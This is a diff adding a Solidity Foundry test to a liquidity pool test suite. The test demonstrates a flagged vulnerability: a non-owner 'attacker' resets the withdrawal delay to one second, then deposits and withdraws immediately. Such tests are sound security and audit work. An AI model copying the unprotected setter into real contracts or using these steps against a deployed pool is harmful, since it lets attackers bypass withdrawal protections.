@@ -308,5 +308,38 @@ contract LiquidityPoolTest is Test {
         assertEq(pool.nonces(signer), nonce + 1);
     }
 
+    function testAnyoneCanSetWithdrawalDelay() public {
+        // VULNERABILITY: Anyone can change the withdrawal delay parameter
+        uint256 newDelay = 1 seconds; // Set to essentially no delay
+
+        // Record original delay
+        uint256 originalDelay = pool.WITHDRAWAL_DELAY();
+        assertEq(originalDelay, 1 days);
+
+        // Attacker (non-owner) changes the delay
+        address attacker = makeAddr("attacker");
+        vm.prank(attacker);
+        pool.setWithdrawalDelay(newDelay);
+
+        // Verify the delay was changed by unauthorized user
+        assertEq(pool.WITHDRAWAL_DELAY(), newDelay);
+        assertLt(pool.WITHDRAWAL_DELAY(), originalDelay);
+
+        // Now attacker can deposit and withdraw immediately (no delay protection)
+        vm.deal(attacker, 1 ether);
+        vm.startPrank(attacker);
+        pool.deposit{value: 1 ether}();
+        // No need to skip delay period - it's been set to 1 second
+        // Wait just a tiny bit to satisfy any time-based requirements
+        skip(2);
+        shareToken.approve(address(pool), shareToken.balanceOf(attacker));
+        // This should now succeed despite just depositing
+        pool.withdraw(shareToken.balanceOf(attacker));
+        vm.stopPrank();
+
+        // Verify immediate withdrawal worked
+        assertEq(shareToken.balanceOf(attacker), 0);
+    }
+
     receive() external payable {}
 }
